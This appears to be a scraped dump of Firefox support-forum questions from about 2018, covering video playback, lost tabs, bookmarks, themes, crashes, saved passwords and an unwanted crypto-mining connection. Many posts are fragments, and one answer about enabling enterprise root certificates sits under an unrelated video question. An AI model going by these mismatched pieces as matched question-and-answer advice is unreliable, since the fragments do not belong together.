I setup my freshly installed openSuse Tumbeweed PC. I have installed Firefox, started Facebook on it and experienced that the videos does not start to play at all. In opposite how it worked on my old linux PC (as normally expected : video starts embedded on its place automatically) on the new PC the video opens in a larger popup but does not start when I press Start button.
Another case when I try to start a mpeg video on my google photos site it says: ""The video format is not supported.""
This whole stuff is supposed to work without any interaction as it work on Chrome on the very same machine. I saw some other problem descriptions from other users but no solutions so far.
I'd like to remain with FF but if this is not solved I'll remove it.
Any idea or better than that: a known fix?

These are root certificates which you've manually imported.  If you understood that last sentence, then it means you've probably done it on your computer; I know I have.  The steps to fix it are these, and I cite the original web page further below:
</p><p>- Open a new window in Firefox and type ""about:config"" without the quotes and hit enter
- Confirm that you want to continue
- In the search field, type in security.enterprise_roots.enabled and hit enter - you'll be left with one field
- If it's marked as ""false"" then double-clicking it should turn it to ""true""
- Close the window, then go back to your Yahoo email login and try again.  For me, this worked *perfectly*!

</p><p>maybe some more precisions:
</p><p>- win7 x64, with FF x64
</p><p>- the ""crashed"" profile has only been opened, not yet closed (I use hibernate so it wont be closed till I have an answer)
</p><p>- I use multiple profiles at once, and the update occured while opening a new profile AND running 2 other profiles
</p><p>- in ""sessionstore-backups"", I only have 2 files, ""recovery.baklz4"" and ""recovery.jsonlz4"", all with a ""Date modified"" AFTER the date of the upgrade
</p><p>- the settings of the ""crashed"" profile are as follow: ""restore old session -&gt; checked"", BUT, ""Clear history when Firefox closes has ALL checkboxes checked"".
</p><p><br>
This is the first time i encounter this bug since Quantum got out. With previous FF, there has ALWAYS been backup files.
I tried an undelete software, but it found NO deleted files in this folder, so I guess the files have been overwritten ...
</p><p><br>
I had like 29 tabs opened, and before this update, the restore session thing was perfectly working.
When the profile opened after the update, there was one page only, the one advertising about pocket (so ironic ^^).
</p><p><br>
What are my chances to recover my tabs ?
</p><p><br>
Bonus questions:
</p><p>- gnnn, why the lz4 thing on session files ? What soft should i use to get a FULL text version ? 7zip wont take it as an archive.
</p><p>- i'm on quantum right now but i'm fed up, it has been disappointments only. I'm using FF since v2 (15+ years), and it's like they killed my browser (apart from the perfs, i only LOST functionnalities). So, back to ESR very quickly, but is that a long-term solution (do not consider security, only websites compatibility) ?
</p><p>- Can i install ESR and quantum in parallel ? Are the profiles retro-compatible/cross-compatible ? I have 29 profiles, but not all of them have seen Quantum yet, so maybe I'm lucky.

1232837,1536419041,Why should the Description Field be removed from Bookmarks?,"<p>Notice I didn't ask why IS it being removed.  That's already been explained, and there appears to be virtually zero support among users for the removal of this feature.  I have log-in information for almost a hundred websites stored in the Description Field in Bookmarks.  I've been reading that many others do as well.  Please understand that I appreciate volunteers taking the time to help users.  That's why I first read the Bugzilla report on this ""bug"" but I could find no evidence of how this solution doesn't cause more harm than good.  One reason for the feature's removal is that the extra coding needed to generate the Description Field is somehow burdensome on FireFox's efficiency.  No evidence is given for this, although I don't doubt it may reduce efficiency by an imperceptible amount.  Another claim is that very few people are taking advantage of the feature, while in the same breath admitting there was no way to actually know this!  
</p><p>I've used FireFox since its inception, and this is the first time I've felt compelled to find the secret handshake that takes me to the registration page so I could ask for support.  I understood when, for example, Quantum broke my ""DownThemAll!"" extension.  However, removing the Description Field feature appears to be a solution in search of a problem.

</p><p>I have no idea why this was done. If it was for some security reason then it is understandable........the change that is, not t he way it was handled.
</p><p>There are solutions given on the Mac thread on how to use another companies add-on to show the past saved descriptions. They are still in the Mozilla data files but are not shown in Ver. 62. You can also do an EXPORT to a .html file and then open the descriptions in the browser. Or you can reinstall Ver. 61.x from the archives and set it to NOT check for updates. This is what I did for the moment.

1232888,1536431738,Is there a replacement in Firefox ESR 60.2 for the leagacy add-on Backward/Forward History Dropdown that allowed you to left-click to view recent history,"<p>I just upgraded from Firefox ESR 52.9 to ESR 60.2.  The upgrade has made my legacy add-on ""Backward/Forward History Dropdown"" dysfunctional.  That add-on displayed a dropdown arrow to the left of the location bar that listed the websites in the same window that I visited in the current browsing session, and enabled me to select a website in the list that I wanted to return to.  (That obviously was much easier than using the Back button to return to recently visited websites one by one.)  The only ways to do that now appear to be to pull down or right-click on the backward or forward indicators, but since I use an old trackpad it would be much more convenient to tap on a dropdown arrow as I used to do.
</p><p>After doing a bit of online research I created a chrome folder in my profile and then 3 subfolders named config, css, and image, along with 2 files called userChrome.css and userContent.css.  I then followed the instructions in this website:
</p><p><a href=""https://github.com/Aris-t2/CustomCSSforFx/releases"" rel=""nofollow"">https://github.com/Aris-t2/CustomCSSforFx/releases</a>
</p><p>I clicked on custom_css_for_fx_v2.0.5.zip and copied the contents of the folders and files into the ones in my chrome folder, except that I copied only one command from the userChrome.css file that looked like it might relate to my issue.  In addition, I copied some script I found elsewhere that made my tab toolbar disappear, since I don't use tabs.  My tab toolbar has disappeared as I wanted, but my backward/forward buttons haven't changed at all and still don't show a dropdown history marker.  The contents of my userChrome.css file are as follows:
</p>
<pre>#tabbrowser-tabs {
visibility: collapse !important;
}

/* other button settings ************************************************************************/
/* @import ""./css/buttons/forward_button_hide_when_disabled.css""; /**/

TBB 8.0 doesn't pick up the active Linux theme elements.  I'm not sure if it ever did, but some things in v8.0 don't suit my needs.  I'm wondering why it doesn't pick up the system theme.
</p><p>Regular Linux Firefox 60.1.0ESR uses the system theme - either native ones from the distro, or custom themes.
So it appears it's NOT just because the theme(s) contain code that Fx Quantum can't use.  Right off, I don't see anything that regular Fx 60.1 ESR isn't using from the active system theme.  
</p><p>AFAIK, there is no change for namespace lines in CSS files from before and after Fx 57.
I made no changes to the system theme after installing Fx 60.1ESR, to make it work.
Apparently, no one on the official Tor  mailing list has any ideas why TBB wouldn't use the system theme.  
</p><p>TBB 8 / Fx 60.2.0 ESR has a /Browser/gtk2/<a href=""http://libmozgtk.so"" rel=""nofollow"">libmozgtk.so</a> file, that appears to control some of the UI, <b>but so does regular Fx 60.1 ESR, </b>and it doesn't ignore the system theme.  The TBB  <a href=""http://libmozgtk.so"" rel=""nofollow"">libmozgtk.so</a> file is larger than the version in regular Fx.
</p><p>Nothing  jumped out for differences in about:config, searching ""theme"" between the TBB version vs. the version from Mozilla.
</p><p>2) Besides TBB 8.0 ignoring the system theme &amp; so far not using code from userChrome that worked in Linux in all regular Fx versions &lt; 57,  Frank Lion says most of old UI css code for pre Firefox 57 will still work for Fx 57+, but some may not.

Browsed internet, learned of Bookmarkdupes (with the 2 stars). Installed, cleaned out bookmarks, and started over building a bookmarks menu. Via Sync, apparently, laptop then had the new bookmark set, as did mobile devices. Some couple of weeks later, while using laptop, bookmarks started duplicating again. From about 100 bookmarks, I wound up with over 4,750. Then, that synced to my desktop and mobile devices. How do I stop the duplicating. Again, browsing the web, some support pages pop up which seem to address the issue. I have already done the Verify Integrity suggestion. But what is Firefox Quantum, what is Foxmarks, now Xmarks. References to those and suggestion don't use Sync. Sync is valuable if you have multiple devices, but worthless if you have to turn it off.

1233066,1536544919,YouTube Default view ON FIREFOX is changed so it's practically the same as Theater mode.  How do I get the old default view back?,"<p>YouTube Default view used to show the video on the left, with the Up Next thumbnails in a column on the right.  (If a playlist was selected, it would appear at the head of the right-hand column with the Up Next thumbnails below it.)  Comments appeared below the video.  
On three other browsers (Chrome, Opera and Vivaldi) YouTube Default view remains the same as before, but ON FIREFOX it's changed to something quite different.  In the new Default view the video stretches horizontally all the way across the screen.  The height is increased proportionately, and on my laptop that means that the video won't fit on the screen heightwise -- what a nuisance, I have to scroll to see the upper and lower parts of the video image: I can't see the whole thing a once. The contents of the (old view) right-hand column now appear below the video, and Comments appear below that.  To get to Comments I have to scroll, scroll, scroll.  It is an ungainly and  confusing layout.
Peculiarly, the new Default view layout is practically the same as the Theater mode.  Th only difference I see is that in the new Default view the panel above the video has a white background, whereas the in the Theater mode that panel has a black background.  Now there's a useful feature!

I give Firefox feedback at least once per week right from the hamburger menu in Firefox and each new version of Firefox makes me happy!

I have changed nothing else on the computer - as far as installation of software is concerned.  I have not loaded or used anything browser related that I was not using before the new version of Firefox was loaded.  I am getting fed up with this string of Crash Reporter windows appearing after every trip to the browser from my email client or anywhere else.
If I knew how to turn it off, I would but then I would not be able to send a report if Firefox was to genuinely crash; something that rarely happens but is not unknown.
My praiseworthy experience of Firefox over many years since previously using Netscape Navigator is being soured by this behaviour.

1233398,1536708411,Something starts happening after two hours or so on Firefox - WHAT IS IT?,"<p>For over a year now, I have experienced the 'phenomenon' that after between two and three hours of browsing, the whole of Firefox just grinds to a halt.  I have tried all the various suggestions but nothing works.
</p><p>I have a large number of tabs, because they are all regularly used in my family history research,  I am moving between web sites all the time to gain information, capture screen shots from Trove, and update data on Ancestry and MyHeritage, particularly,  I am also switching to other programs regularly, e.g. Photoshop Elements, Excel and Word.
</p><p>As a retired programmer, and amateur web site developer, I am wondering whether the browser is doing some activity such as indexing across all tabs, or refreshing of all tabs, after two hours - if so I am seeking some way  to disable this activity, which I don't want to happen, because it is just annoying and wasting precious time in a life timetable which is rapidly coming near to its end.
</p><p>Along similar lines of frustration I am also experiencing that if I leave the browser open and go away to have a meal (for maybe 1 to 2 hours or even sometimes as little as 10 to 15 minutes) it is nearly never possible to get Firefox to just start up again when I go to access a tab in the session that I left open.  Very often Firefox crashes in such situations, while on other occasions it just takes maybe as much as half an hour for it to get back up to pace, so to say. 
</p><p>Again - Is Firefox doing some background tasks?  I do not want Firefox to do any background tasks of ANY KIND.  I simply want a browser that shows me the page when I request it and then leaves it alone, no automatic refreshing, no indexing, no nothing -  simple page display.  I only want refreshing when I ask for it.
</p><p>Finally, this last point is maybe Firefox related, maybe Ancestry related, maybe OS related, I am not sure, but again it is something to do with Firefox not doing the basics, but seemingly doing lots of other things that I do not want it to do.  Often when I add information to a record that is open on a tab in Ancestry, the re-display of the tab, with the updated information, does not come back up with its proper name, e.g. ""Philip Mark Hunt"", instead it just comes up as ""Ancestry Person"".  It is as though the reloading of the tab has hit some kind of timeout, so it just defaults to a general name rather than the true tab name.

1233402,1536711842,editing passwords,"<p>So I have this one website that I have a login name and password for. But Firefox NEVER asks to remember that login. I log in manually repeatedly, and I'm not offered to save it, and It isn't found in ""Saved Logins"". I'd sure like to have Firefox remember that login. How can I do that? It is my understanding that a website can be set up to NOT let the browser login saving work. Maybe that's what's going on here? But is there some way to force that login to be saved? Or some way to edit that information into the ""Saved Logins"" file?

I tried to restore them via Firefox itself. This failed. I tried Mozbackup, this failed. I uninstalled Firefox, restarted my computer and reinstalled. The wrong old bookmarks automatically appeared again and recovering still did not work. 
</p><p>I still have a relatively recent list that I exported to Chrome. I could import them back in and can probably manually restore most by shifting folders and individual bookmarks around.  In that case I would 'only' have lost a few weeks.   Very annoying.

1233412,1536720460,Addons / Extensions / Plugins Safety,"<p>I have always been a firm believer in an addon-free life. I avoid third-party addons like the plague because I've always been paranoid of their capabilities of stealing data and sharing sensitive information.
</p><p>But I'm starting to really get tired of ads, and after looking at some plugins available, I've decided I need to make certain aspects of my browser easier to use. OneTab for example is looking like something that would reduce a lot of headache in my life.
</p><p>I decided to check up on Mozilla and their advice regarding addon safety, and came across this page:
<a href=""https://blog.mozilla.org/addons/2018/02/01/understanding-extension-permission-requests/"" rel=""nofollow"">https://blog.mozilla.org/addons/2018/02/01/understanding-extension-permission-requests/</a>
</p><p>and on that page, I came across this part of the article:
</p>
<hr>
<p>How do I stay safe?
While there is an element of risk to installing any third-party software, there are a few simple best practices you can follow to reduce it. Is the extension made by a reputable developer? Are the user ratings high? Are the permission requests consistent with the features of the extension?
</p>
<hr>
<p>I have a bone to pick with this guideline or, ""best practice"".
</p><p>Is the extension made by a reputable developer? Are the user ratings high?
</p><p>First of all, does the fact that a reputable developer made the addon have any bearing on whether the addon is safe?
</p><p>And second of all, the reputation of the developer is directly influenced by the user-ratings a developer's addon/s receive.
</p><p>Google and Facebook are both majorly reputable companies, and they sell your data like Lemonade on a summer's day.
</p><p>More importantly, user-ratings are only an indication of how well the advertised functions of the addon work. And I bet any addon developer who is developing an addon to do dirty work in the background, is definitely going to make sure that the advertised functions of the addon are in proper working order.
</p><p>Another issue here is that, user-ratings consist primarily of users....The average Joe, not by security researchers, or even developers/coders. Does the average Joe really leave a user rating behind based on how safe he thinks the addon is?
</p><p>Just a thought. Telling people that a ""best practice"" for determining the safety of an addon should factor in the user-rating seems a little misleading.
</p><p>Regardless though, can Firefox not have a function that tells you what kind of info an addon is passing over the internet?
</p><p>Thanks.

</p><p>A lot of times, I will accidentally 'blow-up' the browser to full-screen size while moving the mouse around, equal to intentionally hitting the 'green' traffic light circled button, or using the Firefox pull-down menu 'WINDOW &gt; ZOOM.'  
</p><p>This is a hassle in Mac when done accidentally, because then I have to make the tom menu bar appear by swiping down and up, then manually drag the corner of the active window to reduce the window size.

To wit: I click on 'About Firefox' and I can see the version number without any checks or updates starting without my consent. I am presented with a button to check for updates.

He does NOT need to log onto Firefox sync. 
</p><p>While I was fixing his settings, I noticed he had his home page set to Facebook, whereas previously, I had set it to the Firefox default for him (""New Tab"" still uses the default Firefox page).  When I clicked on the dropdown to change from ""Custom URLs"", nothing dropped down, and I was unable to change the home page.  Eventually, I reset all of his settings to default and restarted.  Then he told me he actually did want Facebook for his home page, and now I couldn't set it back - clicking on the dropdown to change from ""Default"", again, nothing dropped down.  I googled and found another way to change the home page by dragging a tab to the house icon on the page, and that worked, but I do not understand why I am not able to change the home page setting using the options page.

1238064,1540366968,"Default theme refuses to load properly, and looks like the Dark theme after using add-ons?","<p>A few days ago, I was testing a dark theme related add-on, but since uninstalling it, have had this issue where my theme seems to be stuck as the Dark theme that naturally comes with Firefox. When attempting to change my theme in the customize window, mousing over the Default theme does show the proper colors for it, but selecting it still shows the Dark theme colors. I tried examining my Add-ons manager, where it shows that I am still using the Default theme, despite the colors clearly belonging to the Dark theme. I can freely change to the Light theme without issue, but for some reason, the Default one refuses to load properly. I have since tried uninstalling all my Add-ons, deleting my profiles, and uninstalling Firefox before restarting my computer, but to no avail. The Add-on I was examining initially was the Dark Night Mode add-on. Examining the page info, it does say it is not perfect, and their home page says that there are complex issues with getting it to work with Firefox, but I was unable to find more information on this offhand, nor any descriptions of scenarios like mine. I believe the initial settings for my Default theme came from some setting based off my color scheme I have set for my computer themes in general, based off my background, but I was unable to find more information on this at the time. The screenshots I am including are of my Add-on manager showing that I am using the default theme, the customize menu showing the Default theme when highlighted in the drop down menu to change it, and the result that displays when the Default theme is selected. Any ideas on why this issue is occurring, and how to fix it, would be appreciated.

</p><p>Sometimes you want it to save your previous session and sometimes you don't. Sometimes opening Firefox and seeing a bunch of tabs open lets the person that opens it after you know that you were in the middle of something and that they shouldn't close your tabs.  An ""always restore previous session"" setting doesn't cut it. The option to restore your previous session only works if you're the only person using the computer and you remember to do it.
</p><p>The ""Save and Quit"" prompt in every previous version is the perfect solution. Sure, after a certain version, you had to turn it on once for each install in about:config, but lots of people did that.

after updating my FF from 62.03 to 63.0, I experience a strange behaviour. I use the css properties ""display:none""  and ""display:table-cell"" to dynamically show and hide table columns. Prior to FF 63.0 everything worked excellent. But now, after hiding columns (by altering the css property form ""display:table-cell"" to ""display:none""), the table and its content is displayed properly but some of the cells are missing their defined background colour. As soon as doing some action which forces a redraw of the window (e.g. resize the window or scroll the window), the complete table is diplayed properly . In order to give an impression feel free to have a look at the attached images Pre-Collapsed-Table.png, Collapsed-Table.png and Expected-Collapsed-Table.png. Meanwhile I have been playing with the ""visibility"" attribute in order to get the desired result. Unfortunately this is not suitable because hidden elements take up space on the page.

1238230,1540482879,How can the color reproduction of video files be optimized for Firefox?,"<p>Hi Firefox community,
</p><p>I have the problem that the color reproduction of videos seems wrong in Firefox. I have done intense testing with different browsers and could improve color reproduction for IE and Chrome by adding the metadata to the mp4 videos:
</p><p>matrix coefficients: BT.709, 
Transfer characteristics: BT.709
Color primaries: BT.709.
</p><p>Unfortunately these changes do not affect the color reproduction in Firefox. I have compared the color reproduction on an class 1 monitor as well I work in a post production facility. Firefox always differs to the reference using Windows and Mac. On an iPad nevertheless the colors are reproduced correctly in Firefox. Do you have an idea what metadata could be added to videos so that color reproduction gets better on Windows and Mac with Firefox? I have added an example, left Chrome, right Firefox. Thank you in advance.
</p><p>Best
Constantin

Silly me.  Firefox updated itself today and wanted me to enter my google password before doing anything.

Beyond that, Firefox would not accept a security question (the answer to which is precyberhistoristorical).  That is my history, which is not much documented.

</p><p>Every time I open a new webpage, over a hyperlink or manually, Firefox takes 5-8 seconds until it starts to load the page.

After 5-8 seconds Firefox starts to load the page and then it goes very fast.
This makes it impossible to use Firefox, because normal activities take a lot of time, because every click takes 5-8 seconds. On chrome on the same PC everything is OK.

As website owner my convern comes after mozilla is blocking tracking by default meaning that google ads cannot be served by default, only if users will choose so. Most of the mozilla users don't even know what tracking means, so the chances of choosing to allow tracking and serve ads are very low.
Many websites owners use adsense ads to pay for their servers/hosting, their hard work, etc. and as you know every visitors is comsuming resources and bandwidth, so my questions is: Why webmasters shouldn't block mozilla users since the chances to generate revenue thru ads is very low, to none?
I get that it's a great feature to the user, but should be an option rather than a default setting?

1238393,1540578235,Firefox suddenly closes when minimized,"<p>When I minimize Firefox it closes completely and I am not able to return to the tabs I had opened. I have to start completely over. This is hindering my research and writing in a huge way!!! I saw in another post that it always does that, but that is not true. I have been using it for years this way and have never had a problem. It just started closing upon minimization this morning. How do I get it back to how it was? I will have to use a different browser if there is no fix for this and I really don't want to do that.
I should also add that Firefox had been pinned to my taskbar. This morning it was gone and I had to re-pin it there. But it doesn't matter whether I open it from the taskbar or from the menu, it shuts down when I minimize. 
Please help!
I also just noticed that even if I don't minimize it, if I do anything else on my computer it closes and I have to completely restart it. I absolutely can't work this way. For example, if I leave it open and then open my Word document, when I try to go back to Firefox it has closed and has to re-start. All the information I just researched is gone. I'm very, very frustrated.

1238395,1540581442,Do Firefox quantum updates automatically verify developer signature,"<p>If I remember, there was talk on bugzilla about having Firefox updates -  maybe Tbird - automatically verify PGP signatures (or equivalent) in the future.  I'm not talking about checksums.  Checksums only show that files weren't corrupted during download; verifying a PGP signature shows whether a file is identical to the copy the developer loaded  on the download server and that no one tampered with it.
</p><p>Mozilla  no longer provides detached signature files (.asc) for the update files - any where I've seen <a href=""https://ftp.mozilla.org/pub/firefox/releases/63.0/update/linux-x86_64/en-US/"" rel=""nofollow"">https://ftp.mozilla.org/pub/firefox/releases/63.0/update/linux-x86_64/en-US/</a>.

1238499,1540674781,Does Firefox Quantum 63.0 support or can browser incorporate a usable Zotero extension for PubMed search results?,"<p>Information that may help:
</p><p>MacBook (2015),
OS X Mojave 10.14,
Firefox Quantum 63.0,
LibreOffice 6.1.2.1.
</p><p>The situation:
</p><p>Switching to FireFox Quantum v. 63.0 from Safari v. 12 because FireFox application is said to be (from multiple forum discussions) better able to integrate and successfully employ a Zotero citation management utility extension.
</p><p>However, after FireFox download completed, but application not yet installed, user looked for Zotero Firefox extension (plug-in), finding relevant information at only one Mozilla site:
</p><p><a href=""https://addons.mozilla.org/en-US/firefox/addon/zotero-bib-autoexport/"" rel=""nofollow"">https://addons.mozilla.org/en-US/firefox/addon/zotero-bib-autoexport/</a>
</p><p>The Mozilla info screen for ""Zotero Autoexporting"" displayed ""Not compatible with FireFox Quantum"".
</p><p>I have either asked the wrong question about or looked in the wrong place for a functional extension of the Zotero utility and its use with Firefox Quantum and LibreOffice, or FireFox Quantum does not support a usable LibreOffice Zotero extension or connector (I do not know the difference between these two).
</p><p>Having downloaded FireFox Quantum following many, many attempts to configure these named applications / to download the correct application versions / to correctly configure the applications / to troubleshoot incorporating PubMed bibliographic citations using Zotero into LibreOffice 6.1.2.1 documents, to finally read that the Zotero extension is  ""Not compatible with FireFox Quantum"" is massively frustrating.
</p><p>Here is what I want to do:
</p><p>Use the browser Firefox Quantum.  Install into FireFox Quantum an auto-downloading Zotero extension.  Perform PubMed searches. Use Pubmed resources to save searches in a format Zotero can import.  Use Zotero to import and manipulate PubMed-Zotero compatible search results.  Incorporate search results from Zotero into LibreOffice Writer documents.
</p><p>Is this too much to ask?
</p><p>Thank you for advice and instructions.

It asked a bunch of questions of whether I used it or other browsers like chrome, safari, etc, how often and what I use it for, and etc.
At the end of the survey that took about 20-35 minutes, it asked for my email so that they can send me a $5 Amazon Gift Card. I completed this on the 24th.
The website in question where I filled the firefox survey at was, ""<a href=""http://forthrightsurveys.com"" rel=""nofollow"">forthrightsurveys.com</a>""
Returning to the website (specifically the last page right when I submitted my email, ""<a href=""http://forthrightsurveys.com/"" rel=""nofollow"">forthrightsurveys.com/</a>[whole bunch of strings]) gives the prompt 
""This questionnaire has already been completed using your ID. It may only be completed once be each respondent.""
Going to <a href=""http://forthrightsurveys.com"" rel=""nofollow"">forthrightsurveys.com</a> url in general links me specifically to ""<a href=""http://intellisurvey.com"" rel=""nofollow"">intellisurvey.com</a>"", so I can't check to see if I might have put my email wrong.
</p><p>I have been checking my inbox and my junk mail just in case but I have still not received an email. Is there anyway to get my giftcard or to be able to redo the survey in order to be able to get my giftcard? I have tried to check the firefox website for support in general as to who to email in regards to this, but all it leads to is back to this forum to ask my question.

One parent/main process and 3 child processes. All the 3 processes try to connect to <a href=""http://cnhv.co"" rel=""nofollow"">cnhv.co</a> website. Starting the firefox in safe mode or after resetting it still leads to the same behaviour. Only firefox exhibits this behaviour when I try to launch it and when I shut it down. Other browsers do not. 
</p><p>So my question is as follows
1) How do I determine which process or what setting or the location of the infection that is causing Firefox to connect to <a href=""http://cnhv.co?"" rel=""nofollow"">cnhv.co?</a>
2) How do I fix this? How do I clean Firefox such that it does not connect to any crypto website at startup and shutdown?

1238544,1540718482,"When I accidently double click in the blue browzer bar, firefox puts every single open window away. How do I stop this","<p>I occasionally double click to drag an open window to a new location. When I double click in the top bar of the firefox browser, any open windows are put away, not closed...which destroys the link, but put away like clicking on the minus sign in the upper right blue bar that is next to the ""fill page"" icon and the red X that destroys the link.
This may be a property of MS8.1 POS or it might be Firefox. I am sick and tired of having to open all these windows one by one each time my finger ""stutters"" producing a rapid double click. I have tried changing single click and double click response delays, but that does not help either. The morons that wrote MS8.1 load the keystrokes instantly without checking timing. 
Also, does anyone know of an operating system that emulates the MS NT system without all the F------ ""features"" that pervade later OSes??? Many Thanks for your suggestions!!!

</p><p>this wasn't a problem with firefox until quantum was introduced, and from what i hear about the firefox quantum the addon handling was changed to disallow addons access to specific browser system files that some addons were  using that caused firefox to crash,
</p><p>feel free to correct me if i'm wrong but “Once you have eliminated the impossible, whatever remains, however improbable, must be the truth.” iv eliminated all the other probable causes and the changes to the addon handling is all that remains

1238569,1540742694,Firefox is no longer capable of doing many of the things that made it great,"<p>I know the support forum isn't the best place for this, but I really don't know how else to get people's thoughts on this. I get the impression the Devs have no idea how or why some people use Firefox.
</p><p>I've been using Firefox on and off before it was even at version 1.0. When I started working at a big company in 2008 with a locked-down IT policy, Firefox had me 100% covered, and did everything I could ever dream of wanting it to do.
</p><p>In the last year or two, key features that always made it a winner have slowly been disappearing, and now it has gotten to the point that it is actually barely any better than IE11, and no different than Chrome. Why? Big reason is now addons don't work, or can't work the way they used to/need to, but it goes beyond that.
</p><p>1. I can no longer have my homepage open, when I load a new tab. This is absolutely mind boggling, even internet explorer can do that! NOTE: My homepage is a webpage saved on my harddrive that I made that gives me quick access to everything I need to do for work. I used to be able to load it natively, then it became something that required an add-on, and now it is completely broken, and impossible to do.
</p><p>2. Devs clearly don't understand the concept of a PROXY. Lots of people (i.e. in corporate environments) have everything go through a proxy. I can't even use the firefox installer anymore (as I discovered yesterday) because it requires a direct connection to the internet.
</p><p>3. Speaking of Proxy issues, when I open firefox, it immediately needs to connect to the internet, resulting in proxy authentication pop-ups. These used to be Auto-accepted with the addon AUTO-AUTH, however with the new web API crap this apparently isn't possible. There are settings in firefox that are supposed to auto-accept proxy-logins, but they don't work. So - I'm stuck hitting enter every single time I open the bloody program. There is no way to delay or stop firefox from automatically trying to connect to the internet which is also stupid.
</p><p>4. I could go on, but what's the point... the Devs don't care. Time to go back to FF v51 or whatever version it was before things went so wrong and hang on to that, with my windows 7 installation. Sigh.

1238593,1540754029,Firefox always asking to answer puzzles on Recaptcha,"<p>I've installed the latest version of Firefox. Firefox Quantum 63 x64 and ReCaptchas don't work properly. It has been installed on a fresh Windows 10 Pro and Firefox it's at the same time a fresh install like I'm showing on the video at the end of this post. No firewall, no antivirus, no addons, nothing that should stop Firefox from automatically do the ReCaptcha. But every time you click on I'm not a Robot it always prompts you to do a puzzle.
</p><p>Please Firefox, fix this issue. It is pretty frustrating to have to answer every time a puzzle that are ridiculously annoying or having to switch to Google Chrome to use those kind of pages that ask you to answer a ReCaptcha.
</p><p>However, if there is anyone that has a solution, please share it with me or all of us. Because I've been trying to find an answer and haven't find one that works. So I will appreciate a good fix for it.
</p><p>Thanks in advance to the community and hopefully Firefox finds a fix because for what I've read it's a persistent issue with other older versions too.

</p><p>I know, this is an ongoing thing.  I also understand that there are, possibly, other programs that might interfere with Firefox always Asking to save logins and passwords for websites.  I even understand why other password programs might consider Firefox to be a danger to the security of said passwords.  
</p><p>I, however, want Thunderbird to ask to save regardless of what another program or whatever thinks.  Given the number of thoughts on this one I suspect that, eventually, you will figure out a way to simply write it in stone no matter what another program thinks.  
</p><p>I notice that there are command line options.  As far as I can tell I can't tell Firefox, when starting, to make sure the Ask to save logins and passwords for websites is checked but could such a thing be possible?  This would allow me to add a command line when I start firefox on startup.  How about ""Ask to save logins and passwords for websites = 1"" or, say, add a line like that to the profile page?  (that might even be better and then the profile file could become kindofa ini file for users.)

</p><p>Please consider making this upgrade. The ability to mouse over a highlight box and hit delete on the keyboard to immediately and quickly dismiss it, or at the very least a way to select multiple and dismiss enmass. You could also potentially add other shortcuts to this to allow quicker pocketing or bookmarking or history deleting also with different combinations which can be written next to their options in the [...] menu.

</p><p>I have a website that has links to download Adobe DRM files (.acsm).  In Chrome, Internet Explorer and Edge when you click the file button it downloads an .acsm file and opens in Adobe Digital Editions.  In Firefox v63.0 it opens as an xml page in the browser.

I have already reset Firefox back to default and that made no difference.

And even the title of that percent window changed from ""Scale"" to ""ShrinktoFit"". 
</p><p>The problem is that I can't change it out of 30%! When I choose another percent or Shrink to Fit in that Print Preview window (as I've always done for years when I want to change the print size for a particular job), it doesn't hold; next print job it's right back to 30% and tiny print.

And that's for anywhere and anything I print on the internet in Firefox (my Yahoo email, any and all web pages, etc).  I tried downloading Chrome and printing the same test web pages from Chrome and they come out fine. So it appears to be some glitch with Firefox on my PC.

Obfuscation and more clicks is NOT GOOD PROGRAMING!!!

1243405,1544559247,Auto fill/complete for URLs has been working differently/wonky since a couple of months ago,"<p>Firefox has changed the way its URL auto fill works a while ago. (At least 3 months ago; I remember stumbling on a reddit post from Sep 16th saying that it should be fixed with v63, which is why I waited to try it out.) It seems to be mostly with redirects, see examples below, but also with new sites: it seems to only auto complete after you visited a new site at least twice. I'm a fairly advanced user, so I'm quite convinced I've checked all possible solutions, like check settings in about:config, do a clean install, etc. Also, this behaviour has changed on both my computers and my new work pc.
</p><p>I'm fairly certain it used to work like it still does in Pale Moon, which is my preferred method
Examples:
1. If you go to <a href=""http://steampowered.com"" rel=""nofollow"">steampowered.com</a> you're forwarded to <a href=""http://store.steampowered.com"" rel=""nofollow"">store.steampowered.com</a>. If you now close the tab and type 'ste' PM autofills it to <a href=""http://steampowered.com"" rel=""nofollow"">steampowered.com</a>, Fx does not. It does suggest the page, but does not auto complete it (it does, however, autofill 'sto' to <a href=""http://store.steampowered.com"" rel=""nofollow"">store.steampowered.com</a>).
</p><p>2. The same thing happens for <a href=""http://chrome.google.com"" rel=""nofollow"">chrome.google.com</a>, which redirects to <a href=""http://google.com/chrome"" rel=""nofollow"">google.com/chrome</a>
</p><p>3. <a href=""http://ikea.nl"" rel=""nofollow"">ikea.nl</a> forwards to <a href=""http://ikea.com/nl/nl/"" rel=""nofollow"">ikea.com/nl/nl/</a>. PM autofills 'ik' to <a href=""http://ikea.nl"" rel=""nofollow"">ikea.nl</a>, Fx, again, does not. It _does_ auto fill to <a href=""http://ikea.com"" rel=""nofollow"">ikea.com</a>, which is doubly annoying, because now you have to click 'to <a href=""http://ikea.nl"" rel=""nofollow"">ikea.nl</a>' every time.
</p><p>So, is this change by design? Can and will it be fixed/reverted?

1243407,1544560601,Firefox wipes saved passwords...AGAIN!,"<p>Getting fed up Firefox randomly doing this (others have had this happen too) - for no obvious reason the saved logins and passwords section in Options is completely wiped.

1243410,1544561493,Firefox build 63 won't work on my Mac OS High Sierra Macbook Retina,"<p>Firefox has been my default browser for years and it was working super fine until built 63 rolled out (and yes, I've tried all the sub-builds released under 63 and all have the same problem). I'm stuck on Firefox 62.0.3 for now and I keep getting updtate warnings from Firefox and a beating heart banner on top of all my tabs but the reason I can't move up is Firefox itself. 
And yes, I tried all the fixes I could find here before I posted my question.
I update to 63 (even the most recent. 0.1 or whatever) and the exact same thing happen: Google, YoutTube and a Forum account I need to log into for work turn into blank pages. I get no error message, when I enter the address on the toolbar all I get is a blank page with nothing on it and the address bar showing (google, youtube and that forum site). Some websites work, like a news portal I look at, some don't, but, most importantly the triad I mentioned above doesn't, and I need them for work. They'll work on Chrome, Safari but not on Firefox 63.
I turned off Ipv6 thinking this might be it (it wasn't), turned off Little Snitch (nothing changed), turned off BitDefender (still nothing), turned off hardware acceleration, accessibility stuff, you name it, I've done it.
Then the moment I run the installer for Firefox 62 I'm back on all the sites, can see everything.
No idea what this bug is and why is it is only happening on build 63 onwards, but something major changed between 62 and 63 and that something is what is giving me all this grief.
Would a appreciate a suggestion and also would appreciate for people to look into this and try to fix it on a future Firefox update.
Thanks.

1243453,1544602661,Text Boxes not displaying correctly. Linux,"<p>Hello,
